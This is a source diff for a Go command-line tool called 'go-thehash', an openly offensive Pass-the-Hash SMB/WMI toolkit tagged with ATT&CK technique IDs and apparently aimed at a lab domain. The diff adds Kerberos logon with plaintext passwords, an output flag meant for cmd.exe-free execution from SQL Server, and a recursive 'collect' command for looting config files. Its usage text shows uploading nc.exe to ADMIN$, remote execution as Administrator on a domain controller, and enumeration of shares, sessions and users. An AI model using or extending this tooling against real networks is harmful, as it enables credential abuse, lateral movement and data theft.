@@ -19,6 +19,8 @@
 //
 // # Usage
 //
+//	go-thehash [-o <output-file>] <subcommand> [args...]
+//
 //	go-thehash put       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
 //	go-thehash get       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
 //	go-thehash del       <target> <domain> <user> <nt-hash> <share> <remote-path>
@@ -29,6 +31,10 @@
 //	go-thehash enum      shares   <target> <domain> <user> <nt-hash>
 //	go-thehash enum      sessions <target> <domain> <user> <nt-hash>
 //	go-thehash enum      users    <target> <domain> <user> <nt-hash> [netbios-computer-name]
+//
+// The -o flag redirects stdout to a file (stderr unchanged). Use it with
+// sp_OA WScript.Shell.Run for cmd.exe-free execution from SQL Server:
+// the caller reads the output file via sp_OA ADODB.Stream afterward.
 //
 // # Phase 3 lateral movement example (IIS01 -> DC01)
 //
@@ -59,29 +65,44 @@ import (
 
 func usage() {
 	fmt.Fprintf(os.Stderr, `go-thehash - Pass-the-Hash SMB/WMI toolkit
-ATT&CK: T1550.002, T1569.002, T1047, T1135, T1087.001
+ATT&CK: T1550.002, T1078.002, T1569.002, T1047, T1135, T1087.001, T1119
 
 Usage:
-  go-thehash put       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
-  go-thehash get       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
-  go-thehash del       <target> <domain> <user> <nt-hash> <share> <remote-path>
-  go-thehash ls        <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]
-  go-thehash exec      <target> <domain> <user> <nt-hash> <command>
+  go-thehash [-o <output-file>] [-krb] [-dcip <ip>] <subcommand> [args...]
+
+  go-thehash put       [flags] <target> <domain> <user> <credential> <share> <remote-path> <local-path>
+  go-thehash get       [flags] <target> <domain> <user> <credential> <share> <remote-path> <local-path>
+  go-thehash del       [flags] <target> <domain> <user> <credential> <share> <remote-path>
+  go-thehash ls        [flags] <target> <domain> <user> <credential> <share> <remote-dir> [pattern]
+  go-thehash collect   [flags] <target> <domain> <user> <credential> <share> <remote-dir> <local-dir> [pattern]
+  go-thehash exec      [flags] <target> <domain> <user> <credential> <command>
   go-thehash exec-wmi  <target> <domain> <user> <nt-hash> <command>
-  go-thehash pipe      <target> <domain> <user> <nt-hash> <pipe-name> <command>
-  go-thehash enum      shares   <target> <domain> <user> <nt-hash>
-  go-thehash enum      sessions <target> <domain> <user> <nt-hash>
-  go-thehash enum      users    <target> <domain> <user> <nt-hash> [netbios-name]
+  go-thehash pipe      [flags] <target> <domain> <user> <credential> <pipe-name> <command>
+  go-thehash enum      shares   [flags] <target> <domain> <user> <credential>
+  go-thehash enum      sessions [flags] <target> <domain> <user> <credential>
+  go-thehash enum      users    [flags] <target> <domain> <user> <credential> [netbios-name]
+
+Global flags:
+  -o <file>   Redirect stdout to file (stderr unchanged). For sp_OA Run callers.
+  -krb        Authenticate with Kerberos (T1078.002) instead of NTLM pass-the-hash.
+              Make <credential> a plaintext password and <target> a hostname.
+  -dcip <ip>  Optional KDC IP for -krb (default: discover the DC via DNS SRV).
 
 Arguments:
-  target        IP address or hostname of the remote Windows machine
-  domain        Windows domain name (use "." for local accounts)
+  target        Hostname (with -krb) or IP/hostname of the remote Windows machine
+  domain        Windows domain name (use "." for local accounts). With -krb this
+                is the Kerberos realm - the DNS domain (e.g. TESTLAB.LOCAL). A
+                short NetBIOS name (TESTLAB) is accepted; the realm is then
+                derived from the <target> FQDN suffix.
   user          Username (e.g. Administrator)
-  nt-hash       32-hex NT hash, no "0x" prefix
-  share         SMB share name for put/get/del/ls (e.g. ADMIN$, C$)
+  credential    NTLM mode: 32-hex NT hash, no "0x" prefix (T1550.002).
+                -krb mode:  plaintext domain password (T1078.002).
+  share         SMB share name for put/get/del/ls/collect (e.g. ADMIN$, C$)
   remote-path   Path inside the share (e.g. Temp\payload.exe)
-  remote-dir    Directory inside the share to list (e.g. Windows\Temp)
-  pattern       File glob pattern for ls (default: *)
+  remote-dir    Directory inside the share to list/collect (e.g. Windows\Temp)
+  local-dir     Local destination directory for collect (tree is preserved)
+  pattern       File glob for ls; comma-separated globs for collect
+                (e.g. "*.config,*.json" — default: *). Matching is case-insensitive.
   local-path    Local file path for put/get
   command       Full command string; wrap shell builtins:
                   "%%COMSPEC%% /c whoami > C:\Windows\Temp\out.txt"
@@ -89,10 +110,10 @@ Arguments:
   netbios-name  NetBIOS computer name for enum users (auto-detected if omitted)
 
 Examples:
+  # Pass-the-Hash (T1550.002)
   go-thehash put      DC01 TESTLAB Administrator 41c46bf7... ADMIN$ Temp\nc.exe ./nc.exe
   go-thehash get      DC01 TESTLAB Administrator 41c46bf7... C$ Windows\Temp\out.txt ./out.txt
   go-thehash del      DC01 TESTLAB Administrator 41c46bf7... ADMIN$ Temp\nc.exe
-  go-thehash ls       DC01 TESTLAB Administrator 41c46bf7... C$ Windows\Temp
   go-thehash ls       DC01 TESTLAB Administrator 41c46bf7... C$ Windows\Temp *.exe
   go-thehash exec     DC01 TESTLAB Administrator 41c46bf7... "%%COMSPEC%% /c whoami > C:\Temp\out.txt"
   go-thehash exec-wmi DC01 TESTLAB Administrator 41c46bf7... "cmd.exe /c whoami > C:\Temp\out.txt"
@@ -100,11 +121,62 @@ Examples:
   go-thehash enum     shares   DC01 TESTLAB Administrator 41c46bf7...
   go-thehash enum     sessions DC01 TESTLAB Administrator 41c46bf7...
   go-thehash enum     users    DC01 TESTLAB Administrator 41c46bf7... DC01
+
+  # Kerberos valid-account logon (T1078.002) - password + hostname target
+  go-thehash -krb ls      iis01.testlab.local TESTLAB.LOCAL svc_app_dev 'D3vPortal!2025' DevPortal .
+  go-thehash -krb collect iis01.testlab.local TESTLAB.LOCAL svc_app_dev 'D3vPortal!2025' DevPortal . ./loot "*.config,*.json"
+  go-thehash -krb -dcip 10.12.10.10 get iis01.testlab.local TESTLAB.LOCAL svc_app_dev 'D3vPortal!2025' DevPortal appsettings.json ./appsettings.json
 `)
 	os.Exit(1)
 }
 
+// parseGlobalFlags consumes leading global flags (-o, -krb, -dcip) in any
+// order and rewrites os.Args so every branch index reference stays unchanged.
+// The returned *os.File is non-nil only when -o is used; stdout is redirected
+// to it and the caller must keep it open for the program's lifetime.
+func parseGlobalFlags() (useKrb bool, dcip string, output *os.File) {
+	rest := os.Args[1:]
+	keep := []string{os.Args[0]}
+Loop:
+	for len(rest) > 0 {
+		switch rest[0] {
+		case "-o":
+			if len(rest) < 2 {
+				fmt.Fprintln(os.Stderr, "[-] -o requires an <output-file> argument")
+				os.Exit(1)
+			}
+			f, err := os.Create(rest[1])
+			if err != nil {
+				fmt.Fprintf(os.Stderr, "[-] cannot create output file: %v\n", err)
+				os.Exit(1)
+			}
+			os.Stdout = f
+			output = f
+			rest = rest[2:]
+		case "-krb":
+			useKrb = true
+			rest = rest[1:]
+		case "-dcip":
+			if len(rest) < 2 {
+				fmt.Fprintln(os.Stderr, "[-] -dcip requires an <ip> argument")
+				os.Exit(1)
+			}
+			dcip = rest[1]
+			rest = rest[2:]
+		default:
+			break Loop
+		}
+	}
+	os.Args = append(keep, rest...)
+	return
+}
+
 func main() {
+	useKrb, dcip, output := parseGlobalFlags()
+	if output != nil {
+		defer output.Close()
+	}
+
 	if len(os.Args) < 2 {
 		usage()
 	}
@@ -118,10 +190,10 @@ func main() {
 			fmt.Fprintln(os.Stderr, "Usage: go-thehash put <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>")
 			os.Exit(1)
 		}
-		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
+		target, domain, user, cred := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
 		share, remotePath, localPath := os.Args[6], os.Args[7], os.Args[8]
 
-		session, err := session.Connect(target, domain, user, hashHex)
+		session, err := session.Dial(useKrb, target, domain, user, cred, dcip)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
 			os.Exit(1)
@@ -140,10 +212,10 @@ func main() {
 			fmt.Fprintln(os.Stderr, "Usage: go-thehash get <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>")
 			os.Exit(1)
 		}
-		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
+		target, domain, user, cred := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
 		share, remotePath, localPath := os.Args[6], os.Args[7], os.Args[8]
 
-		session, err := session.Connect(target, domain, user, hashHex)
+		session, err := session.Dial(useKrb, target, domain, user, cred, dcip)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
 			os.Exit(1)
@@ -162,10 +234,10 @@ func main() {
 			fmt.Fprintln(os.Stderr, "Usage: go-thehash del <target> <domain> <user> <nt-hash> <share> <remote-path>")
 			os.Exit(1)
 		}
-		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
+		target, domain, user, cred := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
 		share, remotePath := os.Args[6], os.Args[7]
 
-		session, err := session.Connect(target, domain, user, hashHex)
+		session, err := session.Dial(useKrb, target, domain, user, cred, dcip)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
 			os.Exit(1)
@@ -185,14 +257,14 @@ func main() {
 			fmt.Fprintln(os.Stderr, "Usage: go-thehash ls <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]")
 			os.Exit(1)
 		}
-		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
+		target, domain, user, cred := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
 		share, dir := os.Args[6], os.Args[7]
 		pattern := ""
 		if len(os.Args) == 9 {
 			pattern = os.Args[8]
 		}
 
-		session, err := session.Connect(target, domain, user, hashHex)
+		session, err := session.Dial(useKrb, target, domain, user, cred, dcip)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
 			os.Exit(1)
@@ -205,16 +277,43 @@ func main() {
 			os.Exit(1)
 		}
 
+	// -- collect (recursive criteria-based collection) -----------------------
+	case "collect":
+		// collect <target> <domain> <user> <credential> <share> <remote-dir> <local-dir> [pattern]
+		if len(os.Args) < 9 || len(os.Args) > 10 {
+			fmt.Fprintln(os.Stderr, "Usage: go-thehash collect <target> <domain> <user> <credential> <share> <remote-dir> <local-dir> [pattern]")
+			os.Exit(1)
+		}
+		target, domain, user, cred := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
+		share, remoteDir, localDir := os.Args[6], os.Args[7], os.Args[8]
+		pattern := "*"
+		if len(os.Args) == 10 {
+			pattern = os.Args[9]
+		}
+
+		session, err := session.Dial(useKrb, target, domain, user, cred, dcip)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
+			os.Exit(1)
+		}
+		defer session.Close()
+		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)
+
+		if _, err := fileops.CollectFiles(session, share, remoteDir, localDir, pattern); err != nil {
+			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
+			os.Exit(1)
+		}
+
 	// -- exec (service) ------------------------------------------------------
 	case "exec":
 		if len(os.Args) != 7 {
 			fmt.Fprintln(os.Stderr, "Usage: go-thehash exec <target> <domain> <user> <nt-hash> <command>")
 			os.Exit(1)
 		}
-		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
+		target, domain, user, cred := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
 		command := os.Args[6]
 
-		session, err := session.Connect(target, domain, user, hashHex)
+		session, err := session.Dial(useKrb, target, domain, user, cred, dcip)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
 			os.Exit(1)
@@ -233,10 +332,15 @@ func main() {
 			fmt.Fprintln(os.Stderr, "Usage: go-thehash exec-wmi <target> <domain> <user> <nt-hash> <command>")
 			os.Exit(1)
 		}
-		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
+		target, domain, user, cred := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
 		command := os.Args[6]
 
-		hashBytes, err := hex.DecodeString(hashHex)
+		if useKrb {
+			fmt.Fprintln(os.Stderr, "[-] -krb is not supported by exec-wmi (Kerberos DCOM is not wired); use exec or drop -krb")
+			os.Exit(1)
+		}
+
+		hashBytes, err := hex.DecodeString(cred)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[-] invalid NT hash hex: %v\n", err)
 			os.Exit(1)
@@ -254,10 +358,10 @@ func main() {
 			fmt.Fprintln(os.Stderr, "Usage: go-thehash pipe <target> <domain> <user> <nt-hash> <pipe-name> <command>")
 			os.Exit(1)
 		}
-		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
+		target, domain, user, cred := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
 		pipeName, command := os.Args[6], os.Args[7]
 
-		session, err := session.Connect(target, domain, user, hashHex)
+		session, err := session.Dial(useKrb, target, domain, user, cred, dcip)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
 			os.Exit(1)
@@ -277,9 +381,9 @@ func main() {
 			os.Exit(1)
 		}
 		action := os.Args[2]
-		target, domain, user, hashHex := os.Args[3], os.Args[4], os.Args[5], os.Args[6]
+		target, domain, user, cred := os.Args[3], os.Args[4], os.Args[5], os.Args[6]
 
-		session, err := session.Connect(target, domain, user, hashHex)
+		session, err := session.Dial(useKrb, target, domain, user, cred, dcip)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
 			os.Exit(1)
